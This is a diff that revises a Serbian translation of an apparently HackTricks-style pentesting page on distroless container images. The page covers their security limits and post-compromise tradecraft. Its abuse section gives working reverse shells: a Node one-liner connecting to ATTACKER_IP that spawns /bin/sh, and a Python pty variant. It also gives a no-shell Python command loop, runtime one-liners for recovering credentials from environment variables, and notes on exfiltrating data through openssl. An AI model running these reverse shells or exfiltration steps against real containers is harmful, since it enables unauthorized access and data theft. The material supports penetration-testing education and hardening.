@@ -4,66 +4,66 @@
 
 ## Pregled
 
-A **distroless** container image predstavlja sliku koja sadrži **minimalne runtime komponente potrebne za pokretanje jedne specifične aplikacije**, dok namerno uklanja uobičajene alatke distribucije kao što su menadžeri paketa, shell-ovi i velike skupove generičkih userland utilitija. U praksi, distroless slike često sadrže samo aplikacioni binar ili runtime, njegove deljene biblioteke, bundle sertifikata i veoma malu strukturu fajl sistema.
+Image kontejnera tipa **distroless** je image koji sadrži **minimalne runtime komponente potrebne za pokretanje jedne specifične aplikacije**, dok namerno uklanja uobičajene distribucione alate kao što su package managers, shells, i velike skupove generičkih korisničkih utiliteta. U praksi, distroless images često sadrže samo binarni fajl aplikacije ili runtime, njegove deljene biblioteke, bundle-ove sertifikata i vrlo malu strukturu fajl-sistema.
 
-Poenta nije u tome da je distroless nova kernel izolaciona primitiva. Distroless je strategija dizajna slike. Menja šta je dostupno **unutar** fajl sistema kontejnera, a ne kako kernel izoluje kontejner. Ta razlika je važna, jer distroless ojačava okruženje pretežno smanjenjem onoga što napadač može iskoristiti nakon što dobije izvršavanje koda. Ne zamenjuje namespaces, seccomp, capabilities, AppArmor, SELinux, ili bilo koji drugi runtime mehanizam izolacije.
+Poenta nije da je distroless nova kernel isolation primitive. Distroless je **strategija dizajna image-a**. Menja ono što je dostupno **inside** fajl-sistema kontejnera, a ne kako kernel izoluje kontejner. Ta razlika je bitna, jer distroless ojačava okruženje pre svega tako što smanjuje šta napadač može da iskoristi nakon što dobije code execution. Ne zamenjuje namespaces, seccomp, capabilities, AppArmor, SELinux, ili bilo koji drugi runtime isolation mehanizam.
 
 ## Zašto Distroless postoji
 
-Distroless slike se pretežno koriste da smanje:
+Distroless image-i se primarno koriste da smanje:
 
-- veličinu slike
-- operativnu kompleksnost slike
-- broj paketa i binarnih fajlova koji bi mogli sadržati ranjivosti
-- broj post-exploitation alata dostupnih napadaču po defaultu
+- veličinu image-a
+- operativnu složenost image-a
+- broj paketa i binarnih fajlova koji mogu sadržati ranjivosti
+- broj post-exploitation alata dostupnih napadaču podrazumevano
 
-Zato su distroless slike popularne u produkcionim deployment-ima aplikacija. Kontejner koji ne sadrži shell, nema package manager i skoro da nema generički tooling obično je lakše razumeti operativno i teže zloupotrebiti interaktivno nakon kompromisa.
+Zato su distroless image-i popularni u produkcionim deployment-ima aplikacija. Kontejner koji ne sadrži shell, package manager i gotovo nijedan generički alat obično je lakše operativno razumeti i teže ga je zloupotrebiti interaktivno nakon kompromitacije.
 
-Primeri poznatih distroless-style porodica slika uključuju:
+Primeri poznatih distroless-stil familija image-a uključuju:
 
 - Google's distroless images
 - Chainguard hardened/minimal images
 
 ## Šta Distroless ne znači
 
-A distroless kontejner **nije**:
+Distroless kontejner **ne** znači:
 
-- automatski rootless
-- automatski non-privileged
-- automatski read-only
-- automatski zaštićen seccomp-om, AppArmor-om, ili SELinux-om
-- automatski siguran od container escape
+- nije automatski rootless
+- nije automatski non-privileged
+- nije automatski read-only
+- nije automatski zaštićen preko seccomp, AppArmor, ili SELinux
+- nije automatski siguran od container escape
 
-Još uvek je moguće pokrenuti distroless sliku sa `--privileged`, deljenjem host namespace-a, opasnim bind mount-ovima, ili montiranim runtime socket-om. U takvom scenariju, slika može biti minimalna, ali kontejner i dalje može biti katastrofalno nesiguran. Distroless menja **userland attack surface**, ne **kernel trust boundary**.
+I dalje je moguće pokrenuti distroless image sa `--privileged`, host namespace sharing, opasnim bind mount-ovima, ili montiranim runtime socket-om. U tom scenariju, image može biti minimalan, ali kontejner i dalje može biti katastrofalno nesiguran. Distroless menja **userland attack surface**, ne **kernel trust boundary**.
 
 ## Tipične operativne karakteristike
 
-Kada kompromitujete distroless kontejner, prvo što obično primetite je da uobičajene pretpostavke prestaju da važe. Možda nema `sh`, nema `bash`, nema `ls`, nema `id`, nema `cat`, i ponekad čak ni okruženje bazirano na libc koje se ponaša onako kako vaša uobičajena tradecraft očekuje. To utiče i na ofanzivu i na odbranu, jer nedostatak alata menja način debugovanja, incident response-a i post-exploitationa.
+Kada kompromitujete distroless kontejner, prvo što obično primetite je da uobičajena pretpostavke prestaju da važe. Može da nema `sh`, `bash`, `ls`, `id`, `cat`, i ponekad čak ni libc-bazirano okruženje koje se ponaša onako kako vaša uobičajena tradecraft očekuje. Ovo utiče i na ofanzivu i na odbranu, jer nedostatak alata čini debugging, incident response i post-exploitation drugačijim.
 
 Najčešći obrasci su:
 
-- runtime aplikacije postoji, ali skoro ništa drugo ne postoji
-- shell-bazirani payload-i ne rade zato što nema shell-a
-- česti one-lineri za enumeraciju ne rade jer helper binariji nedostaju
-- zaštite fajl sistema kao što su read-only rootfs ili `noexec` na writable tmpfs lokacijama često su prisutne
+- postoji runtime aplikacije, ali skoro ništa drugo
+- shell-based payloads ne uspevaju zato što nema shell-a
+- uobičajeni one-lineri za enumeraciju ne rade jer helper binariji nedostaju
+- fajl-sistemske zaštite kao što su read-only rootfs ili `noexec` na writable tmpfs lokacijama su često prisutne takođe
 
-Ta kombinacija je ono što obično navodi ljude da govore o "weaponizing distroless".
+Ta kombinacija obično dovodi do toga da ljudi pričaju o "weaponizing distroless".
 
-## Distroless And Post-Exploitation
+## Distroless i post-exploitation
 
-Glavni ofanzivni izazov u distroless okruženju često nije inicijalni RCE. Često je problem šta sledi. Ako kompromitovani workload daje izvršavanje koda u language runtime-u kao što su Python, Node.js, Java, ili Go, možda ćete moći da izvršavate proizvoljnu logiku, ali ne kroz normalne shell-centrisane tokove rada koji su uobičajeni na drugim Linux target-ima.
+Glavni ofanzivni izazov u distroless okruženju nije uvek inicijalni RCE. Često je to ono što sledi. Ako kompromitovani workload daje code execution u language runtime-u kao što su Python, Node.js, Java, ili Go, možda ćete moći da izvršavate proizvoljnu logiku, ali ne kroz uobičajene shell-centric workflow-e koji su česti na drugim Linux ciljevima.
 
-To znači da post-exploitation često skreće u jednom od tri pravca:
+To znači da se post-exploitation često pomera u jednom od tri pravca:
 
-1. **Koristite postojeći language runtime direktno** da enumerišete okruženje, otvorite sokete, čitate fajlove, ili stage-ujete dodatne payload-e.
-2. **Ubacite sopstveni tooling u memoriju** ako je fajl sistem read-only ili su writable lokacije montirane `noexec`.
-3. **Iskoristite postojeće binarije koje su već prisutne u slici** ako aplikacija ili njene zavisnosti uključuju nešto neočekivano korisno.
+1. **Iskoristite postojeći language runtime direktno** da enumerišete okruženje, otvorite socket-e, pročitate fajlove, ili postavite dodatne payload-e.
+2. **Ubacite sopstvene alate u memoriju** ako je fajl-sistem read-only ili su writable lokacije mount-ovane sa `noexec`.
+3. **Iskoristite postojeće binarije koje su već prisutne u image-u** ako aplikacija ili njene zavisnosti sadrže nešto neočekivano korisno.
 
-## Abuse
+## Zloupotreba
 
 ### Enumerišite runtime koji već imate
 
-U mnogim distroless kontejnerima nema shell-a, ali i dalje postoji aplikacioni runtime. Ako je target Python servis, Python je prisutan. Ako je target Node.js, Node je prisutan. To često daje dovoljno funkcionalnosti da enumerišete fajlove, pročitate environment varijable, otvorite reverse shells, i pripremite izvršavanje u memoriji bez ikada pozivanja `/bin/sh`.
+U mnogim distroless kontejnerima nema shell-a, ali i dalje postoji runtime aplikacije. Ako je cilj Python servis, Python je prisutan. Ako je cilj Node.js, Node je prisutan. To često daje dovoljno funkcionalnosti za enumeraciju fajlova, čitanje environment varijabli, otvaranje reverse shells i postavljanje izvršavanja u memoriji bez ikakvog pozivanja `/bin/sh`.
 
 Jednostavan primer sa Python-om:
 ```bash
@@ -81,13 +81,13 @@ node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid())
 ```
 Uticaj:
 
-- oporavak varijabli okruženja, često uključujući credentials ili service endpoints
+- oporavak promenljivih okruženja, često uključujući kredencijale ili krajnje tačke servisa
 - enumeracija datotečnog sistema bez `/bin/ls`
-- identifikacija upisivih putanja i montiranih secrets
+- identifikacija zapisivih putanja i montiranih tajni
 
-### Reverse Shell Without `/bin/sh`
+### Reverse Shell bez `/bin/sh`
 
-Ako image ne sadrži `sh` ili `bash`, klasični reverse shell zasnovan na shell-u može odmah da ne uspe. U tom slučaju, umesto toga koristi instalirani runtime jezika.
+Ako image ne sadrži `sh` ili `bash`, klasičan reverse shell zasnovan na shell-u može odmah da ne uspe. U tom slučaju, umesto toga koristite instalirani runtime jezika.
 
 Python reverse shell:
 ```bash
@@ -100,17 +100,17 @@ os.dup2(s.fileno(),fd)
 pty.spawn("/bin/sh")
 PY
 ```
-Ako `/bin/sh` ne postoji, zamenite poslednji red direktnim izvršavanjem komandi pomoću Pythona ili Python REPL petljom.
+Ako `/bin/sh` ne postoji, zamenite poslednji red direktnim izvršavanjem komandi pokrenutim iz Pythona ili Python REPL petljom.
 
 Node reverse shell:
 ```bash
 node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
 ```
-Opet, ako je `/bin/sh` odsutan, koristite Node-ove filesystem, process i networking API-je direktno umesto da pokrećete shell.
+Ponovo, ako `/bin/sh` ne postoji, koristite Node-ove filesystem, process i networking API-je direktno umesto pokretanja shell-a.
 
-### Potpun primer: No-Shell Python Command Loop
+### Potpun primer: No-Shell Python komandna petlja
 
-Ako image ima Python, ali uopšte nema shell, jednostavna interaktivna petlja često je dovoljna da održi punu post-exploitation sposobnost:
+Ako image ima Python, ali uopšte nema shell, jednostavna interaktivna petlja često je dovoljna da zadrži punu post-exploitation capability:
 ```bash
 python3 - <<'PY'
 import os,subprocess
@@ -123,17 +123,17 @@ print(p.stdout, end="")
 print(p.stderr, end="")
 PY
 ```
-Ovo ne zahteva interaktivni shell binarni fajl. Sa stanovišta napadača, efekat je praktično isti kao kod osnovnog shell-a: izvršavanje komandi, enumeracija i postavljanje daljih payloads-a kroz postojeći runtime.
+Ovo ne zahteva interactive shell binary. Uticaj je efektivno isti kao basic shell iz perspektive napadača: command execution, enumeration i staging daljih payloads kroz postojeći runtime.
 
-### Izvršavanje alata u memoriji
+### In-Memory Tool Execution
 
-Distroless images se često kombinuju sa:
+Distroless images are often combined with:
 
 - `readOnlyRootFilesystem: true`
-- pisiv, ali `noexec` tmpfs kao što je `/dev/shm`
-- nedostatak alata za upravljanje paketima
+- writable but `noexec` tmpfs such as `/dev/shm`
+- a lack of package management tools
 
-Ta kombinacija čini klasične radne tokove "preuzmi binarni fajl na disk i pokreni ga" nepouzdanim. U tim slučajevima, tehnike izvršavanja u memoriji postaju glavno rešenje.
+Ta kombinacija čini klasične "download binary to disk and run it" workflows nepouzdanim. U tim slučajevima, memory execution techniques postaju glavno rešenje.
 
 The dedicated page for that is:
 
@@ -150,55 +150,55 @@ The most relevant techniques there are:
 
 ### Postojeći binarni fajlovi već u image-u
 
-Neke distroless images i dalje sadrže operativno neophodne binarne fajlove koji postanu korisni nakon kompromitovanja. Često viđen primer je `openssl`, jer aplikacijama ponekad treba za crypto- ili TLS-povezane zadatke.
+Neki distroless images i dalje sadrže binarne fajlove neophodne za rad koji postanu korisni nakon kompromitovanja. Često uočen primer je `openssl`, jer aplikacije ponekad treba da ga koriste za crypto- ili TLS-related zadatke.
 
-Brz obrazac za pretragu je:
+Brz obrazac pretrage je:
 ```bash
 find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
 ```
-Ako je `openssl` prisutan, može se iskoristiti za:
+Ako je prisutan `openssl`, može se iskoristiti za:
 
-- odlazne TLS veze
-- data exfiltration preko dozvoljenog egress kanala
-- staging payload podataka kroz encoded/encrypted blobs
+- outbound TLS connections
+- data exfiltration over an allowed egress channel
+- staging payload data through encoded/encrypted blobs
 
-Tačna zloupotreba zavisi od toga šta je zapravo instalirano, ali opšta ideja je da distroless ne znači "nema alata uopšte"; znači "daleko manje alata nego u normalnoj distribucijskoj slici".
+Tačna zloupotreba zavisi od toga šta je zaista instalirano, ali suština je da distroless ne znači "no tools whatsoever"; znači "far fewer tools than a normal distribution image".
 
-## Provere
+## Checks
 
-Cilj ovih provera je da se utvrdi da li je image zaista distroless u praksi i koji runtime ili helper binarni fajlovi su i dalje dostupni za post-exploitation.
+Cilj ovih provera je da utvrde da li je image zaista distroless u praksi i koji runtime ili helper binaries su i dalje dostupni za post-exploitation.
 ```bash
 find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
 which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
 cat /etc/os-release 2>/dev/null                                # Often missing or minimal
 mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
 ```
-Zanimljivo ovde:
+Šta je zanimljivo ovde:
 
-- Ako nema shell-a, ali je prisutan runtime kao što su Python ili Node, post-exploitation treba da preusmeri aktivnost na izvršavanje kroz taj runtime.
-- Ako je root filesystem samo za čitanje, a `/dev/shm` je upisiv ali `noexec`, tehnike izvršavanja iz memorije postaju mnogo relevantnije.
-- Ako pomoćni binarni fajlovi kao što su `openssl`, `busybox`, ili `java` postoje, oni mogu ponuditi dovoljno funkcionalnosti za inicijalno proširenje pristupa.
+- Ako shell ne postoji, ali postoji runtime kao Python ili Node, post-exploitation treba da se preusmeri na runtime-driven execution.
+- Ako je root filesystem read-only, a `/dev/shm` je writable ali `noexec`, memory execution techniques postaju mnogo relevantnije.
+- Ako pomoćni binarni fajlovi kao `openssl`, `busybox`, ili `java` postoje, oni mogu pružiti dovoljno funkcionalnosti za bootstrap daljeg pristupa.
 
-## Runtime Defaults
+## Runtime podrazumevane postavke
 
 | Image / platform style | Default state | Typical behavior | Common manual weakening |
 | --- | --- | --- | --- |
-| Google distroless style images | Minimalan userland po dizajnu | Nema shell-a, nema package manager-a, samo application/runtime zavisnosti | dodavanje debugging slojeva, sidecar shell-ova, kopiranje `busybox`-a ili alata |
-| Chainguard minimal images | Minimalan userland po dizajnu | Smanjen paketni opseg, često fokusiran na jedan runtime ili servis | korišćenje `:latest-dev` ili debug varijanti, kopiranje alata tokom build-a |
-| Kubernetes workloads using distroless images | Zavisi od Pod konfiguracije | Distroless utiče samo na userland; bezbednosna pozicija Pod-a i dalje zavisi od Pod spec i runtime podrazumevanja | dodavanje privremenih debug kontejnera, host mount-ova, privilegisanih Pod podešavanja |
-| Docker / Podman running distroless images | Zavisi od run flag-ova | Minimalan filesystem, ali runtime bezbednost i dalje zavisi od zastavica i konfiguracije daemona | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |
+| Google distroless style images | Minimal userland by design | No shell, no package manager, only application/runtime dependencies | adding debugging layers, sidecar shells, copying in busybox or tooling |
+| Chainguard minimal images | Minimal userland by design | Reduced package surface, often focused on one runtime or service | using `:latest-dev` or debug variants, copying tools during build |
+| Kubernetes workloads using distroless images | Depends on Pod config | Distroless affects userland only; Pod security posture still depends on the Pod spec and runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
+| Docker / Podman running distroless images | Depends on run flags | Minimal filesystem, but runtime security still depends on flags and daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |
 
-Ključna poenta je da je distroless **image property**, a ne runtime zaštita. Njena vrednost proizilazi iz smanjenja onoga što je dostupno unutar filesystem-a nakon kompromitovanja.
+Ključna poenta je da je distroless **svojstvo image-a**, a ne runtime zaštita. Njegova vrednost proizilazi iz smanjenja onoga što je dostupno unutar filesystem-a nakon kompromisa.
 
 ## Povezane stranice
 
-Za bypass-e fajl sistema i izvršavanja u memoriji koji su često potrebni u distroless okruženjima:
+Za filesystem i memory-execution bypasses koji su često potrebni u distroless okruženjima:
 
 {{#ref}}
 ../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-Za zloupotrebu container runtime-a, socketa i mount-ova koja i dalje važi za distroless workloads:
+Za container runtime, socket, i mount abuse koji i dalje važe za distroless workloads:
 
 {{#ref}}
 runtime-api-and-daemon-exposure.md
@@ -207,3 +207,4 @@ runtime-api-and-daemon-exposure.md
 {{#ref}}
 sensitive-host-mounts.md
 {{#endref}}
+{{#include ../../../banners/hacktricks-training.md}}
